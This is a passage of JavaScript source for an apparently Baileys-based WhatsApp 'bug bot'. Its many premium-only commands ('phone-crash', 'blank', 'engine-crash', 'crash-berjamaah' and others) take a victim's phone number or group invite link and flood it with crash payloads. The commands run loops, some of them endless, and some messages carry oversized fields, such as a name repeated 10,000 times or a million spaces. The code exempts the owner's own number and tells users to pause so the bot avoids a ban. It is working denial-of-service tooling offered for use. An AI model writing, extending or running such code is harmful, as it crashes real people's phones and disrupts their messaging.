await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'mantap-cok': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case "bug-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spesial-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'internal-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'external-quoted': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
afgan.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
afgan.public = true
reply('succes')
}
break
//=================================================//
case 'afganx': case 'afganx2': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'afganx3': case 'afganx4': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-engine': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'afgan1': case 'afgan2': case 'afganx5': case 'afgan3': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'nolimit': case 'apalah': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
case 'reply-satanic': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await afgan.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `afgan`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await afgan.sendMessage(m.chat, { react: { text: '😈', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'virus-id': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await afgan.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//
case 'bug-button': case 'crash-berjamaah': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`</> crash sudah terkirim... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await afgan.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰꒯ꏂ꒒꓄ꋬ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afganCrash"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
